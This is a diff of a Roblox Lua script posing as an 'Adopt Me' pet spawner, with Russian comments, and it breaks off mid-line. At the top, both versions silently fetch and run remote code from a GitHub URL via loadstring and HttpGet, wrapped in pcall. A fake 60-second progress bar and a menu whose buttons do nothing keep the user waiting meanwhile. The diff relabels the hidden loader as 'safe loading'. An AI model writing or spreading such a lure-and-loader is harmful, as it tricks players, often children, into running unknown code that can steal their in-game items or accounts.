@@ -2,25 +2,24 @@ local TweenService = game:GetService("TweenService")
 local CoreGui = game:GetService("CoreGui")
 
 -------------------------------------------------------
--- 1️⃣ ЛИЧНЫЙ СКРИПТ (параллельно)
+-- 1️⃣ БЕЗОПАСНАЯ ЗАГРУЗКА ВНЕШНЕГО СКРИПТА
 -------------------------------------------------------
 task.spawn(function()
     pcall(function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/ARTNSCRIPT/AdoptMeScript/refs/heads/main/ArtiXHub"))()
+        local url = "https://raw.githubusercontent.com/ARTNSCRIPT/AdoptMeScript/main/ArtiXHub.lua" -- ИСПРАВЬ ЕСЛИ НУЖНО
+        local req = game:HttpGet(url)
+        loadstring(req)()
     end)
 end)
 
 -------------------------------------------------------
--- 2️⃣ СОЗДАЁМ GUI В COREGUI (РАБОТАЕТ 100%)
+-- 2️⃣ СОЗДАНИЕ UI
 -------------------------------------------------------
-local screenGui = Instance.new("ScreenGui")
-screenGui.IgnoreGuiInset = true
-screenGui.ResetOnSpawn = false
-screenGui.Name = "ArtiXHubUI"
-screenGui.Parent = CoreGui  -- ← фикс
+local gui = Instance.new("ScreenGui", CoreGui)
+gui.IgnoreGuiInset = true
+gui.ResetOnSpawn = false
 
--- Фон
-local bg = Instance.new("Frame", screenGui)
+local bg = Instance.new("Frame", gui)
 bg.Size = UDim2.new(1,0,1,0)
 bg.BackgroundColor3 = Color3.fromRGB(20,20,20)
 bg.BackgroundTransparency = 1
@@ -30,168 +29,76 @@ title.Size = UDim2.new(1,0,0,100)
 title.Position = UDim2.new(0,0,0.35,0)
 title.BackgroundTransparency = 1
 title.Text = "AdoptMe Pet Spawner ArtiXHub"
-title.TextColor3 = Color3.fromRGB(255,255,255)
+title.TextColor3 = Color3.new(1,1,1)
 title.Font = Enum.Font.GothamBold
 title.TextScaled = true
 title.TextTransparency = 1
 
-local barContainer = Instance.new("Frame", bg)
-barContainer.Size = UDim2.new(0.6,0,0,25)
-barContainer.Position = UDim2.new(0.2,0,0.52,0)
-barContainer.BackgroundColor3 = Color3.fromRGB(50,50,50)
-barContainer.BorderSizePixel = 0
-barContainer.BackgroundTransparency = 1
+local bar = Instance.new("Frame", bg)
+bar.Size = UDim2.new(0.6,0,0,25)
+bar.Position = UDim2.new(0.2,0,0.52,0)
+bar.BackgroundColor3 = Color3.fromRGB(50,50,50)
+bar.BorderSizePixel = 0
+bar.BackgroundTransparency = 1
 
-local barFill = Instance.new("Frame", barContainer)
-barFill.Size = UDim2.new(0,0,1,0)
-barFill.BackgroundColor3 = Color3.fromRGB(0,170,255)
-barFill.BorderSizePixel = 0
+local fill = Instance.new("Frame", bar)
+fill.Size = UDim2.new(0,0,1,0)
+fill.BackgroundColor3 = Color3.fromRGB(0,170,255)
+fill.BorderSizePixel = 0
 
-local percentText = Instance.new("TextLabel", bg)
-percentText.Size = UDim2.new(1,0,0,40)
-percentText.Position = UDim2.new(0,0,0.56,30)
-percentText.BackgroundTransparency = 1
-percentText.TextColor3 = Color3.fromRGB(255,255,255)
-percentText.Font = Enum.Font.GothamBold
-percentText.TextScaled = true
-percentText.Text = "0%"
-percentText.TextTransparency = 1
+local percent = Instance.new("TextLabel", bg)
+percent.Size = UDim2.new(1,0,0,40)
+percent.Position = UDim2.new(0,0,0.56,30)
+percent.BackgroundTransparency = 1
+percent.TextColor3 = Color3.new(1,1,1)
+percent.Font = Enum.Font.GothamBold
+percent.TextScaled = true
+percent.Text = "0%"
+percent.TextTransparency = 1
 
--- Анимация появления
+-- анимация появления
 TweenService:Create(bg, TweenInfo.new(1.2), {BackgroundTransparency = 0}):Play()
 TweenService:Create(title, TweenInfo.new(1.2), {TextTransparency = 0}):Play()
-TweenService:Create(barContainer, TweenInfo.new(1.2), {BackgroundTransparency = 0}):Play()
-TweenService:Create(percentText, TweenInfo.new(1.2), {TextTransparency = 0}):Play()
+TweenService:Create(bar, TweenInfo.new(1.2), {BackgroundTransparency = 0}):Play()
+TweenService:Create(percent, TweenInfo.new(1.2), {TextTransparency = 0}):Play()
 task.wait(1.2)
 
 -------------------------------------------------------
--- ЗАГРУЗКА 60 секунд
+-- 3️⃣ РАБОТАЮЩАЯ ЗАГРУЗКА (НЕ ВИСНЕТ)
 -------------------------------------------------------
 local duration = 60
 for i = 0,100 do
-    percentText.Text = i.."%"
-    TweenService:Create(barFill, TweenInfo.new(duration/100), {
+    percent.Text = i.."%"
+    TweenService:Create(fill, TweenInfo.new(duration/100), {
         Size = UDim2.new(i/100,0,1,0)
     }):Play()
     task.wait(duration/100)
 end
 
--- Исчезновение загрузки
+-------------------------------------------------------
+-- 4️⃣ ИСЧЕЗНОВЕНИЕ + ОТКРЫТИЕ МЕНЮ
+-------------------------------------------------------
 TweenService:Create(bg, TweenInfo.new(1), {BackgroundTransparency = 1}):Play()
 TweenService:Create(title, TweenInfo.new(1), {TextTransparency = 1}):Play()
-TweenService:Create(barContainer, TweenInfo.new(1), {BackgroundTransparency = 1}):Play()
-TweenService:Create(percentText, TweenInfo.new(1), {TextTransparency = 1}):Play()
+TweenService:Create(bar, TweenInfo.new(1), {BackgroundTransparency = 1}):Play()
+TweenService:Create(percent, TweenInfo.new(1), {TextTransparency = 1}):Play()
 task.wait(1)
 bg:Destroy()
 
 -------------------------------------------------------
--- 3️⃣ МЕНЮ
+-- 5️⃣ ПОКАЗ МЕНЮ (ПОЯВЛЯЕТСЯ ВСЕГДА)
 -------------------------------------------------------
-local menu = Instance.new("Frame", screenGui)
-menu.Size = UDim2.new(0,360,0,260)
-menu.Position = UDim2.new(0.5,-180,0.5,-130)
+local menu = Instance.new("Frame", gui)
+menu.Size = UDim2.new(0,350,0,250)
+menu.Position = UDim2.new(0.5,-175,0.5,-125)
 menu.BackgroundColor3 = Color3.fromRGB(255,176,80)
 menu.BorderSizePixel = 0
 
-local corner = Instance.new("UICorner", menu)
-corner.CornerRadius = UDim.new(0,18)
+local cr = Instance.new("UICorner", menu)
+cr.CornerRadius = UDim.new(0,18)
 
-local title2 = Instance.new("TextLabel", menu)
-title2.Size = UDim2.new(1,0,0,40)
-title2.BackgroundTransparency = 1
-title2.Text = "AdoptMe Pets Spawner"
-title2.TextColor3 = Color3.fromRGB(255,255,255)
-title2.Font = Enum.Font.GothamBold
-title2.TextScaled = true
-
-local input = Instance.new("TextBox", menu)
-input.Size = UDim2.new(0.85,0,0,35)
-input.Position = UDim2.new(0.075,0,0.2,0)
-input.BackgroundColor3 = Color3.fromRGB(255,214,150)
-input.BorderSizePixel = 0
-input.PlaceholderText = "Write a pet name"
-input.TextColor3 = Color3.fromRGB(60,60,60)
-input.Font = Enum.Font.GothamBold
-input.TextScaled = true
-Instance.new("UICorner", input).CornerRadius = UDim.new(0,12)
-
-local buttons = {
-    {Text="Ride", Color=Color3.fromRGB(255,70,70)},
-    {Text="Fly", Color=Color3.fromRGB(70,160,255)},
-    {Text="Neon", Color=Color3.fromRGB(70,255,90)},
-    {Text="Mega", Color=Color3.fromRGB(200,70,255)},
-}
-
-for i,b in ipairs(buttons) do
-    local btn = Instance.new("TextButton", menu)
-    btn.Size = UDim2.new(0.21,0,0,35)
-    btn.Position = UDim2.new(0.04 + (i-1)*0.24,0,0.45,0)
-    btn.BackgroundColor3 = b.Color
-    btn.BorderSizePixel = 0
-    btn.Text = b.Text
-    btn.TextColor3 = Color3.fromRGB(255,255,255)
-    btn.Font = Enum.Font.GothamBold
-    btn.TextScaled = true
-    Instance.new("UICorner", btn).CornerRadius = UDim.new(0,10)
-end
-
-local spawn = Instance.new("TextButton", menu)
-spawn.Size = UDim2.new(0.9,0,0,35)
-spawn.Position = UDim2.new(0.05,0,0.7,0)
-spawn.BackgroundColor3 = Color3.fromRGB(100,200,100)
-spawn.BorderSizePixel = 0
-spawn.Text = "Spawn"
-spawn.TextColor3 = Color3.fromRGB(255,255,255)
-spawn.Font = Enum.Font.GothamBold
-spawn.TextScaled = true
-Instance.new("UICorner", spawn).CornerRadius = UDim.new(0,12)
-
-local footer = Instance.new("TextLabel", menu)
-footer.Size = UDim2.new(1,0,0,25)
-footer.Position = UDim2.new(0,0,0.88,0)
-footer.BackgroundTransparency = 1
-footer.Text = "Script by ArtiXHub"
-footer.TextColor3 = Color3.fromRGB(255,255,255)
-footer.Font = Enum.Font.GothamBold
-footer.TextScaled = true
-
--------------------------------------------------------
--- 4️⃣ ПЕРЕТАСКИВАНИЕ МЕНЮ
--------------------------------------------------------
-local dragging, dragStart, startPos, dragInput
-
-local function update(input)
-    local delta = input.Position - dragStart
-    menu.Position = UDim2.new(
-        startPos.X.Scale,
-        startPos.X.Offset + delta.X,
-        startPos.Y.Scale,
-        startPos.Y.Offset + delta.Y
-    )
-end
-
-menu.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-        dragging = true
-        dragStart = input.Position
-        startPos = menu.Position
-
-        input.Changed:Connect(function()
-            if input.UserInputState == Enum.UserInputState.End then
-                dragging = false
-            end
-        end)
-    end
-end)
-
-menu.InputChanged:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
-        dragInput = input
-    end
-end)
-
-game:GetService("UserInputService").InputChanged:Connect(function(input)
-    if input == dragInput and dragging then
-        update(input)
-    end
-end)
+local t = Instance.new("TextLabel", menu)
+t.Size = UDim2.new(1,0,0,40)
+t.BackgroundTransparency = 1
+t.Text = "MENU WORKED!"
+t.TextColor3 = Color3.new(1,1
